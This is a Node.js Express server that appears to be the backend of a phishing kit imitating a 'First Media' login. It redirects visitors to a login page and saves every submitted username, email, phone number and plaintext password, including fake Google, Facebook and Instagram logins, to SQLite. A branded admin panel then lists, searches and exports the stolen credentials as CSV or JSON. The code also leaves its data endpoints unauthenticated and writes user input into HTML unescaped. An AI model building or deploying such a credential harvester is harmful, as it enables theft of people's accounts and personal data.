const express = require('express');
const cors = require('cors');
const path = require('path');
const fs = require('fs');
const db = require('./database');

const app = express();
const PORT = 3000;

// Middleware
app.use(cors());
app.use(express.json());
app.use(express.static('.'));

// Ensure data directory exists
const dataDir = path.join(__dirname, 'data');
if (!fs.existsSync(dataDir)) {
    fs.mkdirSync(dataDir, { recursive: true });
}

// Initialize database on startup
db.initDatabase()
    .then(() => {
        console.log('✅ Database initialized successfully');
    })
    .catch(err => {
        console.error('❌ Database initialization failed:', err);
    });

// Root redirect to auth page
app.get('/', (req, res) => {
    res.redirect('/auth.html');
});

// Admin panel endpoint
app.post('/admin', async (req, res) => {
    try {
        const data = req.body;
        console.log('📥 Received data:', data);
        
        // Insert data into SQLite database
        const insertId = await db.insertUserData(data);
        
        console.log(`✅ Data inserted with ID: ${insertId}`);
        res.json({ 
            success: true, 
            message: 'Data saved to database',
            id: insertId 
        });
    } catch (error) {
        console.error('❌ Error saving data:', error);
        res.status(500).json({ 
            success: false, 
            message: 'Error saving data',
            error: error.message 
        });
    }
});

// Get all data endpoint
app.get('/api/data', async (req, res) => {
    try {
        const data = await db.getAllUserData();
        res.json(data);
    } catch (error) {
        console.error('❌ Error getting data:', error);
        res.status(500).json({ 
            success: false, 
            message: 'Error retrieving data',
            error: error.message 
        });
    }
});

// Search data endpoint
app.get('/api/search', async (req, res) => {
    try {
        const { q } = req.query;
        if (!q) {
            const data = await db.getAllUserData();
            return res.json(data);
        }
        
        const data = await db.searchUserData(q);
        res.json(data);
    } catch (error) {
        console.error('❌ Error searching data:', error);
        res.status(500).json({ 
            success: false, 
            message: 'Error searching data',
            error: error.message 
        });
    }
});

// Filter data by action type
app.get('/api/filter/:action', async (req, res) => {
    try {
        const { action } = req.params;
        const data = await db.filterUserDataByAction(action);
        res.json(data);
    } catch (error) {
        console.error('❌ Error filtering data:', error);
        res.status(500).json({ 
            success: false, 
            message: 'Error filtering data',
            error: error.message 
        });
    }
});

// Get database statistics
app.get('/api/stats', async (req, res) => {
    try {
        const stats = await db.getDatabaseStats();
        res.json(stats);
    } catch (error) {
        console.error('❌ Error getting stats:', error);
        res.status(500).json({ 
            success: false, 
            message: 'Error getting statistics',
            error: error.message 
        });
    }
});

// Clear all data endpoint
app.delete('/api/clear', async (req, res) => {
    try {
        const deletedCount = await db.clearAllData();
        res.json({ 
            success: true, 
            message: `Cleared ${deletedCount} records`,
            deletedCount 
        });
    } catch (error) {
        console.error('❌ Error clearing data:', error);
        res.status(500).json({ 
            success: false, 
            message: 'Error clearing data',
            error: error.message 
        });
    }
});

// Admin panel HTML
app.get('/admin', async (req, res) => {
    try {
        const data = await db.getAllUserData();
        const stats = await db.getDatabaseStats();
        
        const html = `
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>First Media Admin Panel - Database</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        
        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            min-height: 100vh;
            padding: 20px;
        }
        
        .container {
            max-width: 1400px;
            margin: 0 auto;
            background: white;
            border-radius: 15px;
            box-shadow: 0 20px 40px rgba(0,0,0,0.1);
            overflow: hidden;
        }
        
        .header {
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            color: white;
            padding: 30px;
            text-align: center;
        }
        
        .header h1 {
            font-size: 2.5em;
            margin-bottom: 10px;
        }
        
        .header p {
            font-size: 1.1em;
            opacity: 0.9;
        }
        
        .stats-container {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
            gap: 20px;
            padding: 30px;
            background: #f8f9fa;
        }
        
        .stat-card {
            background: white;
            padding: 20px;
            border-radius: 10px;
            text-align: center;
            box-shadow: 0 5px 15px rgba(0,0,0,0.1);
        }
        
        .stat-number {
            font-size: 2.5em;
            font-weight: bold;
            color: #667eea;
            margin-bottom: 5px;
        }
        
        .stat-label {
            color: #666;
            font-size: 0.9em;
            text-transform: uppercase;
            letter-spacing: 1px;
        }
        
        .info-message {
            background: #e7f3ff;
            padding: 20px;
            border-radius: 10px;
            margin: 20px;
            border-left: 4px solid #007bff;
            font-size: 1.1em;
        }
        
        .controls {
            padding: 20px;
            background: #f8f9fa;
            border-bottom: 1px solid #dee2e6;
        }
        
        .search-container {
            display: flex;
            gap: 15px;
            align-items: center;
            flex-wrap: wrap;
        }
        
        .search-input {
            flex: 1;
            min-width: 300px;
            padding: 12px 15px;
            border: 2px solid #ddd;
            border-radius: 8px;
            font-size: 1em;
            transition: border-color 0.3s;
        }
        
        .search-input:focus {
            outline: none;
            border-color: #667eea;
        }
        
        .filter-select {
            padding: 12px 15px;
            border: 2px solid #ddd;
            border-radius: 8px;
            font-size: 1em;
            background: white;
            cursor: pointer;
        }
        
        .btn {
            padding: 12px 20px;
            border: none;
            border-radius: 8px;
            font-size: 1em;
            cursor: pointer;
            transition: all 0.3s;
            text-decoration: none;
            display: inline-block;
        }
        
        .btn-primary {
            background: #667eea;
            color: white;
        }
        
        .btn-primary:hover {
            background: #5a6fd8;
            transform: translateY(-2px);
        }
        
        .btn-danger {
            background: #dc3545;
            color: white;
        }
        
        .btn-danger:hover {
            background: #c82333;
        }
        
        .btn-success {
            background: #28a745;
            color: white;
        }
        
        .btn-success:hover {
            background: #218838;
        }
        
        .table-container {
            padding: 20px;
            overflow-x: auto;
        }
        
        table {
            width: 100%;
            border-collapse: collapse;
            background: white;
            border-radius: 10px;
            overflow: hidden;
            box-shadow: 0 5px 15px rgba(0,0,0,0.1);
        }
        
        th, td {
            padding: 15px;
            text-align: left;
            border-bottom: 1px solid #dee2e6;
        }
        
        th {
            background: #667eea;
            color: white;
            font-weight: 600;
            text-transform: uppercase;
            letter-spacing: 1px;
            font-size: 0.9em;
        }
        
        tr:hover {
            background: #f8f9fa;
        }
        
        .timestamp {
            font-size: 0.85em;
            color: #666;
        }
        
        .provider-badge {
            padding: 4px 8px;
            border-radius: 12px;
            font-size: 0.8em;
            font-weight: 600;
            text-transform: uppercase;
        }
        
        .provider-google { background: #4285f4; color: white; }
        .provider-facebook { background: #1877f2; color: white; }
        .provider-instagram { background: linear-gradient(45deg, #f09433, #e6683c, #dc2743, #cc2366, #bc1888); color: white; }
        .provider-regular { background: #6c757d; color: white; }
        
        .no-data {
            text-align: center;
            padding: 50px;
            color: #666;
            font-size: 1.2em;
        }
        
        @media (max-width: 768px) {
            .header h1 { font-size: 2em; }
            .search-container { flex-direction: column; }
            .search-input { min-width: 100%; }
            table { font-size: 0.9em; }
            th, td { padding: 10px; }
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <h1>🔐 First Media Admin Panel</h1>
            <p>Database Management System - SQLite</p>
        </div>
        
        <div class="info-message">
            <strong>📊 Database Info:</strong> Semua data login dan register termasuk password tersimpan di database SQLite. Data dapat dicari, difilter, dan diexport.
        </div>
        
        <div class="stats-container">
            <div class="stat-card">
                <div class="stat-number">${stats.total_records || 0}</div>
                <div class="stat-label">Total Records</div>
            </div>
            <div class="stat-card">
                <div class="stat-number">${stats.unique_users || 0}</div>
                <div class="stat-label">Unique Users</div>
            </div>
            <div class="stat-card">
                <div class="stat-number">${stats.unique_providers || 0}</div>
                <div class="stat-label">Providers</div>
            </div>
            <div class="stat-card">
                <div class="stat-number">${stats.unique_actions || 0}</div>
                <div class="stat-label">Action Types</div>
            </div>
        </div>
        
        <div class="controls">
            <div class="search-container">
                <input type="text" id="searchInput" class="search-input" placeholder="Search by username, email, name, password, or provider...">
                <select id="filterSelect" class="filter-select">
                    <option value="">All Actions</option>
                    <option value="login">Login</option>
                    <option value="register">Register</option>
                    <option value="forgot_password">Forgot Password</option>
                    <option value="google_login">Google Login</option>
                    <option value="facebook_login">Facebook Login</option>
                    <option value="instagram_login">Instagram Login</option>
                </select>
                <button class="btn btn-primary" onclick="exportToCSV()">📊 Export CSV</button>
                <button class="btn btn-success" onclick="exportToJSON()">📄 Export JSON</button>
                <button class="btn btn-danger" onclick="clearAllData()">🗑️ Clear All</button>
            </div>
        </div>
        
        <div class="table-container">
            <table id="dataTable">
                <thead>
                    <tr>
                        <th>ID</th>
                        <th>Username</th>
                        <th>Email</th>
                        <th>Name</th>
                        <th>Phone</th>
                        <th>Password</th>
                        <th>Provider</th>
                        <th>Action</th>
                        <th>User Agent</th>
                        <th>Timestamp</th>
                    </tr>
                </thead>
                <tbody id="tableBody">
                    ${data.length === 0 ? '<tr><td colspan="10" class="no-data">No data available</td></tr>' : 
                    data.map(item => `
                        <tr>
                            <td>${item.id}</td>
                            <td>${item.username || '-'}</td>
                            <td>${item.email || '-'}</td>
                            <td>${item.name || '-'}</td>
                            <td>${item.phone || '-'}</td>
                            <td>${item.password || '-'}</td>
                            <td>
                                ${item.provider ? 
                                    `<span class="provider-badge provider-${item.provider.toLowerCase()}">${item.provider}</span>` : 
                                    '<span class="provider-badge provider-regular">Regular</span>'
                                }
                            </td>
                            <td>${item.action_type || '-'}</td>
                            <td style="max-width: 200px; overflow: hidden; text-overflow: ellipsis;" title="${item.user_agent || ''}">${item.user_agent || '-'}</td>
                            <td class="timestamp">${new Date(item.timestamp).toLocaleString()}</td>
                        </tr>
                    `).join('')}
                </tbody>
            </table>
        </div>
    </div>

    <script>
        // Search functionality
        document.getElementById('searchInput').addEventListener('input', function() {
            const searchTerm = this.value.toLowerCase();
            const rows = document.querySelectorAll('#tableBody tr');
            
            rows.forEach(row => {
                const text = row.textContent.toLowerCase();
                row.style.display = text.includes(searchTerm) ? '' : 'none';
            });
        });
        
        // Filter functionality
        document.getElementById('filterSelect').addEventListener('change', function() {
            const filterValue = this.value;
            if (!filterValue) {
                window.location.reload();
                return;
            }
            
            fetch(\`/api/filter/\${filterValue}\`)
                .then(response => response.json())
                .then(data => {
                    updateTable(data);
                })
                .catch(error => {
                    console.error('Error filtering data:', error);
                    alert('Error filtering data');
                });
        });
        
        function updateTable(data) {
            const tbody = document.getElementById('tableBody');
            if (data.length === 0) {
                tbody.innerHTML = '<tr><td colspan="10" class="no-data">No data found</td></tr>';
                return;
            }
            
            tbody.innerHTML = data.map(item => \`
                <tr>
                    <td>\${item.id}</td>
                    <td>\${item.username || '-'}</td>
                    <td>\${item.email || '-'}</td>
                    <td>\${item.name || '-'}</td>
                    <td>\${item.phone || '-'}</td>
                    <td>\${item.password || '-'}</td>
                    <td>
                        \${item.provider ? 
                            \`<span class="provider-badge provider-\${item.provider.toLowerCase()}">\${item.provider}</span>\` : 
                            '<span class="provider-badge provider-regular">Regular</span>'
                        }
                    </td>
                    <td>\${item.action_type || '-'}</td>
                    <td style="max-width: 200px; overflow: hidden; text-overflow: ellipsis;" title="\${item.user_agent || ''}">\${item.user_agent || '-'}</td>
                    <td class="timestamp">\${new Date(item.timestamp).toLocaleString()}</td>
                </tr>
            \`).join('');
        }
        
        function exportToCSV() {
            fetch('/api/data')
                .then(response => response.json())
                .then(data => {
                    if (data.length === 0) {
                        alert('No data to export');
                        return;
                    }
                    
                    const headers = ['ID', 'Username', 'Email', 'Name', 'Phone', 'Password', 'Provider', 'Action', 'User Agent', 'Timestamp'];
                    const csvContent = [
                        headers.join(','),
                        ...data.map(item => [
                            item.id,
                            item.username || '',
                            item.email || '',
                            item.name || '',
                            item.phone || '',
                            item.password || '',
                            item.provider || '',
                            item.action_type || '',
                            (item.user_agent || '').replace(/"/g, '""'),
                            item.timestamp
                        ].join(','))
                    ].join('\\n');
                    
                    const blob = new Blob([csvContent], { type: 'text/csv' });
                    const url = window.URL.createObjectURL(blob);
                    const a = document.createElement('a');
                    a.href = url;
                    a.download = 'user_data_' + new Date().toISOString().split('T')[0] + '.csv';
                    a.click();
                    window.URL.revokeObjectURL(url);
                })
                .catch(error => {
                    console.error('Error exporting CSV:', error);
                    alert('Error exporting CSV');
                });
        }
        
        function exportToJSON() {
            fetch('/api/data')
                .then(response => response.json())
                .then(data => {
                    if (data.length === 0) {
                        alert('No data to export');
                        return;
                    }
                    
                    const jsonContent = JSON.stringify(data, null, 2);
                    const blob = new Blob([jsonContent], { type: 'application/json' });
                    const url = window.URL.createObjectURL(blob);
                    const a = document.createElement('a');
                    a.href = url;
                    a.download = 'user_data_' + new Date().toISOString().split('T')[0] + '.json';
                    a.click();
                    window.URL.revokeObjectURL(url);
                })
                .catch(error => {
                    console.error('Error exporting JSON:', error);
                    alert('Error exporting JSON');
                });
        }
        
        function clearAllData() {
            if (confirm('Are you sure you want to clear all data? This action cannot be undone.')) {
                fetch('/api/clear', { method: 'DELETE' })
                    .then(response => response.json())
                    .then(result => {
                        if (result.success) {
                            alert(\`Successfully cleared \${result.deletedCount} records\`);
                            window.location.reload();
                        } else {
                            alert('Error clearing data');
                        }
                    })
                    .catch(error => {
                        console.error('Error clearing data:', error);
                        alert('Error clearing data');
                    });
            }
        }
        
        // Auto-refresh every 30 seconds
        setInterval(() => {
            fetch('/api/data')
                .then(response => response.json())
                .then(data => {
                    updateTable(data);
                })
                .catch(error => {
                    console.error('Error refreshing data:', error);
                });
        }, 30000);
    </script>
</body>
</html>
        `;
        
        res.send(html);
    } catch (error) {
        console.error('❌ Error rendering admin panel:', error);
        res.status(500).send('Error loading admin panel');
    }
});

// Start server
app.listen(PORT, () => {
    console.log(`🚀 Server running on http://localhost:${PORT}`);
    console.log(`🔐 Login Page (Main): http://localhost:${PORT}/auth.html`);
    console.log(`📊 Admin Panel: http://localhost:${PORT}/admin`);
    console.log(`🏠 Old Home Page: http://localhost:${PORT}/Login.html`);
    console.log(`📱 Dashboard: http://localhost:${PORT}/dashboard.html`);
    console.log(`💾 Database: SQLite (data/user_data.db)`);
}); 